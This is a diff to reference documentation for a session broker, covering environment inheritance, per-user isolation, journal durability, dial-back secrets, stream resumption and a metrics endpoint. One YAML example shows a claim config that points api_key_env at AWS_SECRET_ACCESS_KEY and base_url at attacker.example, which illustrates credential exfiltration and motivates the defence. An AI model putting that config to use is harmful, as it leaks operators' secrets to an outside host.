+A claimed instance is handed a config **the caller wrote**, and every Nexus
+provider resolves its credential from an environment variable that config
+*names* — `api_key_env` and its equivalents — while the same config chooses
+`base_url`. So an environment variable that reaches an instance is not merely
+visible to it, it is postable anywhere by whoever claimed the lease:
+
+```yaml
+# a claim body's `config`, which the broker execs an instance against
+core:
+  models:
+    default:
+      provider: openai
+      api_key_env: AWS_SECRET_ACCESS_KEY    # any variable the process holds
+      base_url: https://attacker.example    # where its value gets sent
+```
+
+An allowlist of *known* provider key names cannot bound that, because the caller
+picks the name. The broker therefore builds a spawn's environment from scratch
+rather than inheriting its own, in this order (later wins, since `exec` resolves
+a duplicated key to its last occurrence):
+
+1. **The always-pass set** — `HOME`, `LANG`, `PATH`, `TZ` — taken from the
+   broker's environment regardless of configuration. These are not credentials
+   and are not optional: `HOME` is what resolves `~/.nexus`, so without it an
+   instance cannot create a session directory and `-recall` has nothing to
+   resume; `PATH` is what makes `exec` and the shell tool work at all; `TZ` and
+   `LANG` decide how the instance renders times and text.
+2. **Everything `inherit_env` names**, taken from the broker's environment. A
+   name the broker does not hold is **skipped rather than exported empty** — an
+   instance can tell "unset" from "set to the empty string", and a provider
+   handed `api_key_env=""` fails less legibly than one that finds the variable
+   absent.
+3. **The selected entry's `env`** map, applied in sorted key order. This is the
+   per-variant declaration point, and it *sets* a value rather than forwarding
+   one, so it can also override something step 1 or 2 contributed.
+4. **The three broker-owned variables** — `NEXUS_BROKER_ADDR`,
+   `NEXUS_BROKER_LEASE_ID`, `NEXUS_BROKER_SPAWN_SECRET`. Last, always, so
+   nothing an entry or the broker's shell contributes can point an instance at a
+   different broker, hand it another lease's id, or supply its own spawn secret.
+
+Steps 1–3 are emitted in sorted key order, so the environment a spawn is handed
+is byte-identical across restarts.
+
+At boot the broker logs **one line per registry entry** naming exactly the
+variables that entry's spawns will carry — names only, never values:
+
+```
+level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
+  resolved_path=/opt/builds/nexus-vision \
+  spawn_env=ANTHROPIC_API_KEY,HOME,LANG,NEXUS_BROKER_ADDR,NEXUS_BROKER_LEASE_ID,NEXUS_BROKER_SPAWN_SECRET,NEXUS_VISION,PATH,TZ
+```
+
+Because the line reports what will be **carried** rather than what was declared,
+a name that is missing from it was never in the broker's own environment. Those
+are also collected into one startup `WARN`:
+
+```
+level=WARN msg="inherit_env names variables this broker's own environment does not hold, ..." missing=ANTHROPIC_API_KEY
+```
+
+```yaml
+# broker.yaml — forward two provider keys the broker was started with
+inherit_env:
+  - ANTHROPIC_API_KEY
+  - OPENAI_API_KEY
+
+binaries:
+  vision:
+    path: /opt/builds/nexus-vision
+    env:
+      NEXUS_VISION: "1"          # set outright, not forwarded
+```
+
+Use `inherit_env` when the value lives in the broker's own environment (a secret
+injected by systemd, Kubernetes or a secrets agent) and `binaries.<name>.env`
+when the value is a property of the variant. A claim's own `config` can of
+course still carry a credential inline, in which case neither key is involved.
+
+**There is no wildcard.** `inherit_env: ["*"]` is not supported and is not
+planned: it would restore exactly the exfiltration primitive above, and because
+the caller picks the variable name in its own config, "forward everything except
+the risky ones" is not a line anybody can draw.
+
+**This is a breaking change** for a broker that predates the key — a spawn used
+to take `os.Environ()` wholesale, so an instance whose config expects to read
+`ANTHROPIC_API_KEY` from the environment now fails to reach its provider on the
+first turn unless the name is declared here or set in the entry's `env`. The
+migration is in
+[Upgrading an existing broker](../guides/session-broker.md#upgrading-an-existing-broker).
+
+`inherit_env` is [reloadable](#reloadable-keys-sighup) and applies to the next
+spawn.
+
+### Running instances as another user (`run_as`)
+
+Without `run_as`, every claimed instance runs as the **broker's own uid** with
+the broker's `HOME`. The process boundary between two claims is then not a
+privilege boundary: one tenant's instance can read every other tenant's session
+directory under `~/.nexus/sessions/`, and it can read `<state_dir>/spawn-key` —
+which is enough to derive any live lease's dial-back secret and impersonate its
+instance. `run_as` is what turns a separate process into a separate principal.
+
+```yaml
+# broker.yaml
+run_as:                       # the default for every entry that declares none
+  uid: 1500
+  gid: 1500
+
+binaries:
+  vision:
+    path: /opt/builds/nexus-vision
+    run_as:                   # replaces the default outright — not merged
+      uid: 1501
+      gid: 1501
+
+  support:
+    path: /opt/builds/nexus-support
+    run_as:
+      uid: 1502
+      gid: 1502
+    env:
+      HOME: /var/lib/nexus/support   # operator-set data dir; wins over the passwd home
+```
+
+- **Per entry over a broker default.** The interesting separation is between
+  *variants*: a vision build and a support agent want to be apart from each
+  other, not merely from the host. An entry that writes `run_as` replaces the
+  broker-level block **wholesale** — a uid taken from one place and a gid from
+  another is a credential nobody wrote down.
+- **Both fields are required** whenever the block is written. A uid without a gid
+  leaves instances in the broker's primary group, so their session files stay
+  reachable from it — a boundary that looks complete in the config and is not one
+  on disk.
+- **Ids are numeric**, not user names. Resolving a name needs the passwd
+  database, which a hardened container may not carry, and a name that resolves
+  differently on two hosts is a silent privilege change.
+- **`HOME` follows the credential.** `HOME` is what resolves `~/.nexus`, so an
+  instance dropped to another uid while still pointed at the broker's home cannot
+  create its session directory and every claim fails at the first write. The
+  broker therefore resolves the `run_as` user's home from the passwd database at
+  boot and gives the spawn that `HOME`; an entry's `env.HOME` overrides it and is
+  the way to put instance state somewhere other than a home directory. A uid with
+  no resolvable home and no `env.HOME` **fails startup**, naming the entry and
+  the key that fixes it.
+- **Sessions are consistent per registry entry.** Two entries running under
+  different credentials keep their sessions in different trees. Resume stays
+  correct because a session already records the entry that created it and a
+  resume under a different entry is refused with **409** — see
+  [Resume inherits the recorded binary](#resume-inherits-the-recorded-binary) —
+  so a session can never be replayed under an entry whose `HOME` would not
+  contain it.
+- **Supplementary groups are dropped.** The child calls `setgroups(0, NULL)`, so
+  it holds only the declared gid; keeping the broker's group memberships would
+  leave the instance able to reach most of what the key exists to take away.
+
+**The broker must be privileged.** Setting a child's credentials — including
+dropping supplementary groups — requires **root**, or `CAP_SETUID` and
+`CAP_SETGID` on Linux. This is true even when the `uid` named is the broker's
+own. A broker configured with `run_as` that lacks the privilege logs one `WARN`
+at boot:
+
+```
+level=WARN msg="run_as is configured but this broker does not run as root, ..." euid=501
+```
+
+and every claim that selects such an entry fails **at spawn**, immediately, with
+**HTTP 500** `{"error":"spawning instance"}` and a broker-side log line naming
+the refused credential — not a claim that hangs until the ready timeout.
+
+Each entry's credential and resolved home appear in the boot log beside its path
+and spawn environment:
+
+```
+level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
+  resolved_path=/opt/builds/nexus-vision spawn_env=… run_as=1501:1501 run_as_home=/home/nexus-vision
+```
+
+**What `run_as` does not do.** It separates instances **by OS user**, and that is
+the whole of it. It does not sandbox the filesystem, restrict the network, or
+bound CPU and memory — a claim still supplies the whole engine config, and the
+shell and file tools still run with whatever that uid can reach. It does not
+separate two instances of the **same** entry from each other: they share a
+credential and a session tree. Nor does it protect an instance from the
+*claimant*, who chose its config and drives its tools.
+
+Leaving `run_as` unset is therefore a statement that every caller of this broker
+may read every other caller's sessions and its `spawn-key`. That is fine inside
+one trust domain and is not fine between two — **deploy one broker per trust
+domain, or set `run_as`**. See
+[Trust boundaries](../guides/session-broker.md#trust-boundaries).
 
 ### Binary resolution
 
@@ -3869,9 +4162,23 @@ record each, via a temp file and an atomic rename — so a crash mid-compaction
 leaves the previous journal intact. At any moment the file holds at most
 (live leases + 512) records, however many leases have come and gone.
 
-**Failure handling.** A journal write that fails is **logged and otherwise
-ignored**: it never fails a claim or a release, because durability must not
-become a new way for the broker to refuse service. A record that was being
+**Durability.** Every append is `fsync`ed before it returns, and a compaction
+fsyncs the temp file **before** the rename and the containing **directory**
+after it. The journal therefore survives a power loss or a hard reset, not only
+`kill -9`: rename is atomic but not durable, and an unsynced tail is exactly
+where the record carrying an instance's `pid` lives — losing it would leave the
+next boot closing out a lease whose process is still running. The barrier is
+unconditional rather than restricted to the pid-bearing record; the cost is
+roughly **three fsyncs per lease lifetime** (minted, pid/session recorded,
+released), which is why singling out one record kind was not worth the invariant.
+The `session-binaries.jsonl` and `a2a-contexts.jsonl` indexes are **not** fsynced:
+both are best-effort, an unknown key means *no opinion, proceed*, and losing
+their tail degrades to the behaviour that predates them rather than to a wrong
+answer.
+
+**Failure handling.** A journal write **or fsync** that fails is **logged and
+otherwise ignored**: it never fails a claim or a release, because durability must
+not become a new way for the broker to refuse service. A record that was being
 written when the broker was killed leaves a torn final line; the reader **skips
 it with a warning** and keeps every complete record before it, and the
 rewrite-on-open truncates it away. An unreadable or malformed line anywhere in
@@ -4006,12 +4313,13 @@ an instance dials `/instance` and presents both the correct lease id **and** the
 correct spawn secret. Once it does, the lease is fully ordinary: idle sweeping,
 crash watching, ownership checks and `POST /release` all apply unchanged.
 
-**A restored lease always requires the spawn secret, even with no `auth:`
-block.** Liveness is not identity: the pid recorded before the restart may have
-been recycled to an unrelated process, and a signal-0 probe (the portable check
-on Linux and macOS) cannot see the difference. Admitting a dialer on a lease id
-alone would hand a stranger's process a client's session, so this check is not
-configurable.
+**Liveness is not identity**, which is why a restored lease is not handed to
+whoever dials in naming it: the pid recorded before the restart may have been
+recycled to an unrelated process, and a signal-0 probe (the portable check on
+Linux and macOS) cannot see the difference. Admitting a dialer on a lease id alone
+would hand a stranger's process a client's session. The spawn secret settles it,
+and it is required on **every** registration — restored or not, `auth:` block or
+not (see [Instance dial-back authentication](#instance-dial-back-authentication-ws-instance)).
 
 **How the secret survives when it is never written down.** The per-spawn secret
 is **derived**, not stored: `HMAC-SHA256(<state_dir>/spawn-key, lease_id)`. The
@@ -4043,11 +4351,15 @@ at all is still fatal — that is a misconfiguration, not lost data.) With
 ### Authentication (`auth:`)
 
 The `auth:` block configures an ordered chain of credential validators
-(`pkg/nexusauth`). Five routes are authenticated by middleware — `POST /claim`,
-`POST /release/{lease_id}`, `GET /leases`, `POST /ticket/{lease_id}`, and
-`GET /binaries`.
+(`pkg/nexusauth`). Six routes are authenticated by middleware — `POST /claim`,
+`POST /release/{lease_id}`, `GET /leases`, `POST /ticket/{lease_id}`,
+`GET /binaries` and `GET /metrics`.
 `GET /healthz` is registered **outside** the guard and always answers `200` with
 no credential, because a load balancer or container probe has none to present.
+
+`GET /metrics` is the one route that layers a second check on top of the
+middleware: it additionally requires `auth.admin_scope`. See
+[`GET /metrics`](#get-metrics-http-api-not-yaml).
 
 `WS /lease/{lease_id}`, the per-lease client socket, is not behind that
 middleware but **does** use the same validator chain: it resolves the caller's
@@ -4087,7 +4399,7 @@ auth:
 
 | Key                                    | Type            | Default    | Description                                                                                     |
 |----------------------------------------|-----------------|------------|-------------------------------------------------------------------------------------------------|
-| `auth.admin_scope`                     | string          | `nexus.broker.admin` | The scope a validated credential must carry to be treated as a broker **operator**. It widens `GET /leases` from "the caller's own leases" to the whole registry plus the capacity aggregates — and **nothing else**: `POST /release/{lease_id}` and `WS /lease/{lease_id}` stay strict principal-`ID` ownership, so a leaked operator credential cannot tear down or hijack another principal's session. Comparison is exact and case-sensitive. Set it to `""` (or `admin_scope:` with no value) to mean **no caller is an operator**, which makes `GET /leases` caller-scoped for everybody. Irrelevant while auth is disabled — the endpoint is then unrestricted for all callers. |
+| `auth.admin_scope`                     | string          | `nexus.broker.admin` | The scope a validated credential must carry to be treated as a broker **operator**. It widens `GET /leases` from "the caller's own leases" to the whole registry plus the capacity aggregates, and it is required to scrape `GET /metrics` — and **nothing else**: `POST /release/{lease_id}` and `WS /lease/{lease_id}` stay strict principal-`ID` ownership, so a leaked operator credential cannot tear down or hijack another principal's session. Comparison is exact and case-sensitive. Set it to `""` (or `admin_scope:` with no value) to mean **no caller is an operator**, which makes `GET /leases` caller-scoped for everybody and refuses `GET /metrics` to everybody. Irrelevant while auth is disabled — both endpoints are then unrestricted for all callers. |
 | `auth.validators`                      | list            | `[]`       | Validators to try, **in order**; the first one that accepts the request wins, so cheap validators belong first. An empty or absent list means auth is disabled. Unknown keys are rejected at every level. |
 | `auth.validators[].type`               | string          | *required* | Validator implementation: `static` (a table of shared tokens), `jwks` (OIDC JWTs verified against an issuer's published key set), `introspect` (opaque tokens verified by calling the issuer's RFC 7662 introspection endpoint), or `proxy_headers` (an identity a fronting authenticating proxy already established, honoured only for peers inside a CIDR allowlist). |
 | `auth.validators[].principal_claim`    | string          | `""`       | Which claim becomes `Principal.ID`. Parsed for every entry; **required for `jwks` and `introspect`**, accepted and ignored by `static` and `proxy_headers` (neither has a claim set — `proxy_headers` uses `principal_header` instead). |
@@ -4480,23 +4792,37 @@ to the `NEXUS_BROKER_ADDR` / `NEXUS_BROKER_LEASE_ID` /
 
 #### Instance dial-back authentication (`WS /instance`)
 
-The `auth:` block also gates the **instance** dial-back, not just the
-control-plane routes. With it configured, the `register` frame must carry both a
-known `lease_id` **and** the per-spawn secret the broker minted for that lease
-(128 bits of `crypto/rand`, injected through the child's environment at exec).
-Anything else — an unknown lease, an absent secret, a wrong secret — is closed
-with the same `policy violation` / `unknown lease` close, so a dialer cannot
-difference the responses to enumerate live lease ids.
+The `auth:` block does **not** govern the instance dial-back. That block says how
+*clients* are verified; `WS /instance` is where a process the broker started
+proves it is that process, and it does so with the per-spawn secret the broker
+minted for the lease (injected through the child's environment at exec, never
+argv).
 
-The gate exists because of **version skew**. With no `auth:` block the secret is
-not checked at all, so a [registry entry](#binary-registry-binaries) pointing at
-a build that predates the protocol keeps working unchanged. With one configured,
-such a build is refused and the broker logs a `WARN` naming the version skew
-explicitly — otherwise the symptom (every claim returning `504 instance did not
-become ready in time` while the child process is alive and connecting fine) reads
-as a network fault. The check is per **spawn**, so one stale variant fails while
-every other entry keeps working; the fix is to upgrade the binary that entry
-points at.
+**The secret is required unconditionally** — `auth:` block or not, claimed lease
+or restored lease. The register frame must carry a known `lease_id`, a `version`
+matching the broker's own frame schema version, and the matching secret.
+
+> **Breaking change.** Enforcement used to be gated on the `auth:` block being
+> present, so an unauthenticated broker (the documented default) admitted any
+> register frame naming a live lease — including one carrying no secret at all.
+> Lease ids are not secret: they travel in `ws_url`s, client requests and logs, so
+> anything that observed one could register as that lease's instance the moment
+> the real socket dropped. A `nexus` build predating the protocol now fails to
+> register on **every** broker, and removing the `auth:` block is no longer a
+> workaround. Upgrade the binary the [registry entry](#binary-registry-binaries)
+> points at; the check is per **spawn**, so one stale variant fails while every
+> other entry keeps working. The step-by-step migration is in
+> [Upgrading an existing broker](../guides/session-broker.md#upgrading-an-existing-broker).
+
+Every refusal — unknown lease, absent secret, wrong secret, skewed frame version
+— is closed with the same `policy violation` / `unknown lease` close, so a dialer
+cannot difference the responses to enumerate live lease ids. **The log is the only
+place the causes are distinguished**, and each `WARN` names its own fix: upgrade
+the binary (skewed version), upgrade the binary (absent secret), or investigate an
+impostor (wrong secret). None of them ever contains a secret value. The
+diagnostics matter because the symptom is identical and misleading — every claim
+returns `504 instance did not become ready in time` while the child process is
+alive and connecting fine, which reads as a network fault.
 
 The secret is never logged, never returned by `GET /leases`, and never passed in
 argv.
@@ -4536,6 +4862,9 @@ process.
 The selected entry's `args` are appended after the broker's own `-config` /
 `-recall` arguments, and its `env` is layered under the broker-owned
 `NEXUS_BROKER_*` variables — see [Binary registry](#binary-registry-binaries).
+The spawned instance does **not** inherit the broker's environment wholesale: it
+carries the always-pass set, whatever [`inherit_env`](#instance-environment-inherit_env)
+declares, the entry's `env`, and the `NEXUS_BROKER_*` trio, and nothing else.
 
 When `session_id` is set the broker spawns the instance with `-recall <id>` so
 the engine reloads that session and replays its history; when omitted it starts
@@ -4635,6 +4964,12 @@ logs one `WARN` at startup naming the consequence: `ws_url`s will be derived fro
 each request's `Host` header. The broker still starts — this shape is correct for
 a directly-reachable broker.
 
+A `wss://` or `https://` `advertise_addr` likewise logs one `WARN` at startup: the
+broker has no TLS listener, so it is advertising a scheme it does not serve. The
+broker still starts, because that is exactly right behind a TLS-terminating proxy
+and the process cannot tell whether one is there. Advertise `ws://` (or a bare
+`host:port`) on a broker nothing fronts.
+
 This resolution is **client-facing only**. The `/instance` dial-back address
 handed to a spawned instance is resolved separately and always collapses a
 wildcard bind to `127.0.0.1`, because instances are same-host by design;
@@ -4646,8 +4981,24 @@ wildcard bind to `127.0.0.1`, because instances are same-host by design;
 sends a `shutdown` frame to the instance, whose `nexus.io.broker` plugin emits
 `io.session.end` so the engine performs a clean `Stop` — flushing and
 persisting the session before exit. The broker then waits up to `release_grace`
-for the process to exit and **force-kills it** if that window elapses (no
-orphan). The lease is removed and its slot freed. The session directory under
+for the process to exit, and if that window elapses it **escalates**:
+
+1. `SIGTERM` to the instance's process group. The engine treats `SIGTERM` as a
+   clean shutdown, so this is a second graceful chance rather than a kill — and,
+   unlike the `shutdown` frame, it needs nothing from the dial-back socket. An
+   instance that is wedged or mid reconnect-backoff never receives the frame at
+   all, and this is the only teardown request it gets.
+2. `SIGKILL` to the same process group, **2s** later, if the process is still
+   there. That window is a fixed constant, not a config key: `release_grace` is
+   the operator's shutdown budget and has already elapsed by this point.
+
+Both signals go to the **process group**, not the instance process alone, so
+everything the instance started — shell-tool commands, MCP stdio servers, code
+interpreters — dies with it instead of being re-parented to init. Each instance
+is made the leader of its own process group at spawn time for exactly this
+reason.
+
+The lease is removed and its slot freed. The session directory under
 `~/.nexus/sessions/<id>/` is left intact and remains resumable via `-recall`.
 
 | Outcome                                  | Status | Body                                      |
@@ -4764,9 +5115,63 @@ was before authentication existed. A client built for an authenticated broker ca
 point a `?ticket=` at an open one and it still connects, rather than being refused
 by a store that never issued anything.
 
-After the upgrade, only inbound `io` frames (client → instance) reset the
-`idle_timeout` timer, and a frame whose `lease_id` does not match the socket's
-lease is dropped.
+After the upgrade, inbound `io` frames (client → instance) reset the
+`idle_timeout` timer — as does the instance reporting its turn finished, and a
+turn in flight suspends the timer entirely (see
+[`idle_timeout`](#session-broker-nexus-broker)) — and a frame whose `lease_id`
+does not match the socket's lease is dropped.
+
+#### `?from_seq=<n>` — resuming a dropped stream
+
+A **second** query parameter, orthogonal to the credential: `?from_seq=<n>` states
+the highest [`seq`](#session-broker-nexus-broker) the client received before its
+socket dropped. The broker replays every frame it still retains **after** `n`,
+oldest first, and only then continues with the live stream — replayed frames
+always precede live ones. It is a query parameter for the same reason `?ticket=`
+is (a browser cannot set headers on a WebSocket upgrade, and there is no
+client → broker control frame to carry it in), and the two **compose in any
+order**.
+
+`?from_seq=` is **not a credential.** Ticket precedence, ownership and every
+refusal above are unchanged by its presence: it can never widen what a caller may
+connect to, only what an already-admitted caller is handed first.
+
+| Value | Behaviour |
+|-------|-----------|
+| Absent | The live stream only — byte for byte what every connect did before resumption existed. |
+| `0` | Replay **everything** the buffer still holds. Not the same as absent: it is a client saying it has seen nothing. |
+| `n` > 0 | Replay the retained frames with `seq > n`. |
+| `n` greater than the lease's last `seq` | Reported as a `restarted` gap (see below) and the whole retained buffer is replayed — the client's numbering came from a stream that no longer exists. |
+| Malformed (not a number, negative, out of range) | Treated as **absent**, never refused. A resume is an optimisation on top of a connection that works without it, so a client bug in building the URL costs the replay, not the session. |
+
+The replay is **not** bounded by the connection's 256-frame send queue — it is
+written ahead of it — so the full [`client_replay_buffer_bytes`](#session-broker-nexus-broker)
+worth of frames replays intact however many frames that is.
+
+**When the buffer cannot cover the resume point**, the socket opens with a
+`stream-gap` frame *before* anything else, naming the range that is gone:
+
+```json
+{"version":1,"lease_id":"…","signal":"stream-gap",
+ "payload":{"reason":"evicted","requested_from_seq":41,"missing_from_seq":42,"missing_through_seq":118}}
+```
+
+| Field | Meaning |
+|-------|---------|
+| `reason` | `evicted` — the frames aged out of the bounded buffer. `restarted` — `requested_from_seq` is ahead of this lease's stream, which is what a lease restored across a broker restart looks like (the buffer is in-memory, so a restored lease renumbers from 1). |
+| `requested_from_seq` | Echoes the `from_seq` presented, so a client with several sockets in flight can tell which request it answers. |
+| `missing_from_seq`, `missing_through_seq` | **Inclusive** bounds of the frames the broker can no longer supply. Both are **omitted** when nothing is nameable — a `restarted` stream has no missing range under the new numbering. |
+
+The gap frame carries **no `seq`**: it describes one connection, not the lease's
+frame stream, so numbering it would make the stream's sequence depend on how often
+a client dropped. A gap is a **normal outcome a client must handle**, not an
+error — it is what any disconnection longer than the buffer produces. Adding the
+`stream-gap` signal needed no `brokerframe` version bump for the same reason `seq`
+did not: it is only ever sent to a client that opted in by presenting `?from_seq=`.
+
+The reconnect recipe end to end — mint a fresh ticket, send `from_seq`, handle the
+gap — is in the
+[session broker guide](../guides/session-broker.md#reconnecting-and-resuming-a-stream).
 
 ### `GET /leases` (HTTP API, not YAML)
 
@@ -4789,12 +5194,14 @@ capacity and queue aggregates. It performs no mutation.
   "max_concurrent": 8,     // configured cap (0 = unlimited)
   "slots_in_use": 2,       // live instances currently holding a slot
   "queue_depth": 0,        // claims parked in the FIFO capacity wait queue
+  "max_queue_depth": 32,   // configured ceiling on that queue (0 = unlimited)
   "leases": [
     {
       "lease_id": "…",
       "session_id": "…",                       // omitted until reported by the instance
       "pid": 41234,
       "state": "active",                        // "spawning" | "active" | "draining"
+      "binary": "vision",                       // registry entry NAME; "" = not recorded
       "reason": "manual release",               // teardown reason once draining; omitted otherwise
       "last_activity": "2026-06-25T12:00:00Z",  // RFC3339
       "created_at": "2026-06-25T11:59:30Z"      // RFC3339
@@ -4815,6 +5222,7 @@ caller's own leases and **no aggregate keys at all**:
       "session_id": "…",
       "pid": 41234,
       "state": "active",
+      "binary": "vision",
       "last_activity": "2026-06-25T12:00:00Z",
       "created_at": "2026-06-25T11:59:30Z"
     }
@@ -4822,11 +5230,26 @@ caller's own leases and **no aggregate keys at all**:
 }
 ```
 
-The aggregates are **absent, not zeroed**: `max_concurrent`, `slots_in_use` and
-`queue_depth` let one tenant infer another's load, and a zero would read as a
-factual claim about an idle broker to a client that does not know it is
-unprivileged. Clients must therefore treat a missing key as "not disclosed"
-rather than as `0`.
+The aggregates are **absent, not zeroed**: `max_concurrent`, `slots_in_use`,
+`queue_depth` and `max_queue_depth` let one tenant infer another's load, and a
+zero would read as a factual claim about an idle broker to a client that does not
+know it is unprivileged. Clients must therefore treat a missing key as "not
+disclosed" rather than as `0`.
+
+`max_queue_depth` is reported **beside** `queue_depth` because the observed depth
+is unreadable without its bound: a depth of 12 is either a busy broker or one
+about to start refusing claims with `capacity queue full`, and only the ceiling
+tells them apart. It follows `max_concurrent`'s convention — `0` means unlimited.
+
+`binary` is the [binary registry](#binary-registry-binaries) entry **name** this
+lease's instance was spawned from — a name, never a path, so it discloses nothing
+[`GET /binaries`](#get-binaries-http-api-not-yaml) does not already list. It
+appears in **both** response shapes. It is always present, and an **empty string
+means "not recorded"** — a lease restored from a lease journal written before the
+field existed, for instance. It never means "the entry named empty string", which
+cannot exist. Unlike `session_id` and `reason` it is *not* omitted when empty,
+precisely so a client can tell "not recorded" from "this broker is too old to
+report it".
 
 A caller that owns no live lease gets `200` with `{"leases": []}` — never a `404`
 and never an error. Filtering happens inside the registry snapshot, under the same
@@ -4881,9 +5304,11 @@ tell "the operator wrote nothing" from "the operator wrote an empty string". A
 consumer with no label falls back to `name`, which is always present.
 
 Ordering is by `name`, ascending — stable across requests and identical for every
-caller, so a picker does not reshuffle. The *contents* are not stable across a
-restart: the registry is read once at startup, so an operator's edit changes the
-listing the next time the broker boots. The reserved `nexus` entry is always
+caller, so a picker does not reshuffle. The *contents* are not stable over time:
+`binaries:` is [reloadable](#reloadable-keys-sighup), so an operator's edit
+changes the listing on the next `SIGHUP` (or the next boot). The listing and the
+configuration it was rendered from are published in one atomic swap, so a caller
+never sees a half-applied registry. The reserved `nexus` entry is always
 included: it is spawnable from every broker no matter what the config says.
 
 The listing is **unfiltered** — every caller sees every entry. There is no
@@ -4896,6 +5321,79 @@ same middleware, so with an `auth:` block a missing or invalid credential is
 refused (**401**) and a valid one gets the list; with no `auth:` block the route
 serves an unauthenticated caller, which is a supported deployment rather than a
 degraded one.
+
+### `GET /metrics` (HTTP API, not YAML)
+
+`GET /metrics` is the broker's Prometheus scrape surface. It is read-only,
+mutates nothing, and takes no parameters. The response is the Prometheus **text
+exposition format** with `Content-Type: text/plain; version=0.0.4; charset=utf-8`.
+
+The exposition is hand-rolled: the broker is stdlib plus `github.com/coder/websocket`,
+and no client library is pulled in for it. There is **no configuration key** — the
+route is always mounted.
+
+**Authorization is stricter than every other route.** It sits behind the same
+`auth:` middleware as `POST /claim`, *and* additionally requires
+`auth.admin_scope`:
+
+| Broker configuration                          | Caller                              | Result |
+|-----------------------------------------------|-------------------------------------|--------|
+| No `auth:` block                              | anyone                              | `200` + exposition |
+| `auth:` configured                            | no / invalid credential             | `401` (from the guard) |
+| `auth:` configured                            | valid credential, no `admin_scope`  | `403` `{"error":"insufficient scope"}` |
+| `auth:` configured                            | valid credential **with** `admin_scope` | `200` + exposition |
+| `auth:` configured, `admin_scope` set to `""` | anyone                              | `403` — nobody is an operator |
+
+The rule matches [`GET /leases`](#get-leases-http-api-not-yaml): every number here
+is a **whole-registry aggregate**, which is exactly the disclosure the leases
+listing already reserves for an operator. With no `auth:` block it serves anyone,
+exactly as every other route on this binary does.
+
+**Metric names are a stable surface.** All are namespaced `nexus_broker_`, and
+their cardinality is bounded by construction — no metric is ever labelled by lease
+id, principal, session id or binary path, and every label value comes from a
+compile-time set, so each declared series is present (at `0`) from the very first
+scrape and an alert can be written against it before it ever fires.
+
+| Metric | Type | Labels | Meaning |
+|---|---|---|---|
+| `nexus_broker_claims_total`           | counter   | `outcome` | Instance claims handled by the shared spawn spine — `POST /claim` **and** the A2A ingress — by outcome. |
+| `nexus_broker_claim_duration_seconds` | histogram | —         | Wall time of an **accepted** claim, request to ready instance. A refusal is not observed here. |
+| `nexus_broker_spawn_failures_total`   | counter   | `reason`  | Spawns that produced no ready instance. |
+| `nexus_broker_frames_dropped_total`   | counter   | `reason`  | Broker frames discarded rather than relayed. |
+| `nexus_broker_replay_gaps_total`      | counter   | `reason`  | Stream-gap notices served to a resuming client. |
+| `nexus_broker_client_evictions_total` | counter   | —         | Client WebSockets displaced by a newer connection on the same lease. |
+| `nexus_broker_config_reloads_total`   | counter   | `outcome` | SIGHUP reloads, `applied` or `rejected`. |
+| `nexus_broker_restored_leases_total`  | counter   | `outcome` | Leases adopted from the journal at boot, and what became of them. |
+| `nexus_broker_slots_in_use`           | gauge     | —         | Capacity slots currently held: one per live lease. |
+| `nexus_broker_max_concurrent`         | gauge     | —         | Configured `max_concurrent`. `0` = unlimited. |
+| `nexus_broker_queue_depth`            | gauge     | —         | Claims parked in the FIFO capacity queue. |
+| `nexus_broker_max_queue_depth`        | gauge     | —         | Configured `max_queue_depth`. `0` = unlimited. |
+| `nexus_broker_leases`                 | gauge     | `state`   | Live leases by the `GET /leases` surface state: `spawning`, `active`, `draining`. |
+| `nexus_broker_tickets_outstanding`    | gauge     | —         | Issued, unredeemed WebSocket tickets still held. |
+
+Label values:
+
+| Label | Metric | Values |
+|---|---|---|
+| `outcome` | `nexus_broker_claims_total` | `accepted`, `rejected`, `no_capacity`, `queue_timeout`, `queue_full`, `principal_lease_limit`, `principal_queue_limit`, `cancelled`, `spawn_failed`, `ready_timeout`, `internal` |
+| `reason`  | `nexus_broker_spawn_failures_total` | `exec`, `exited_before_ready`, `ready_timeout` |
+| `reason`  | `nexus_broker_frames_dropped_total` | `undecodable`, `lease_mismatch`, `no_instance`, `instance_buffer_full`, `client_buffer_full`, `lease_gone` |
+| `reason`  | `nexus_broker_replay_gaps_total` | `evicted`, `restarted` |
+| `outcome` | `nexus_broker_config_reloads_total` | `applied`, `rejected` |
+| `outcome` | `nexus_broker_restored_leases_total` | `restored`, `reattached`, `reaped` |
+| `state`   | `nexus_broker_leases` | `spawning`, `active`, `draining` |
+
+The three capacity refusals — `no_capacity`, `queue_timeout`, `queue_full` — all
+answer HTTP `503`, and they are separate label values precisely because they call
+for three different fixes (raise `max_concurrent`, raise `queue_wait_timeout`,
+raise `max_queue_depth`). Grouping a dashboard by status code loses that.
+
+The counters are **process-lifetime and monotonic**; they reset on restart, as
+Prometheus counters are expected to. The gauges are read from live state at scrape
+time — from the same `slots_in_use` / waiter-queue counters the capacity
+accounting and `GET /leases` already use — so they cannot drift from what the
+registry actually holds.
 
 Full narrative, the new-vs-resume flow, a WebSocket connect sketch, and the v1
 deployment caveats live in the
